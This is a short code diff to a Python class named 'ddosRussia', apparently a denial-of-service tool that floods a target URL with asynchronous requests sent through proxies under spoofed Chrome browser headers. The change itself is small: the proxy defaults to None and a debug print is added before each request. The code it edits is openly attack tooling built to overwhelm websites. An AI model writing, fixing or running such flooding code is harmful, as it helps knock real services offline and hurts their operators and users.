@@ -7,7 +7,7 @@ import threading
 class ddosRussia:
     def __init__(self, url, proxy):
         self.url = url
-        self.proxy = proxy
+        self.proxy = proxy or None
         self.headers = {
             'sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="96", "Chromium";v="97"',
             'sec-ch-ua-mobile': '?0',
@@ -19,6 +19,7 @@ class ddosRussia:
 
     async def fetch_url_data(self, session):
         try:
+            print(self.proxy)
             async with session.get(self.url, timeout=10, proxy=self.proxy) as response:
                 resp = await response.read()
                 # print(resp)
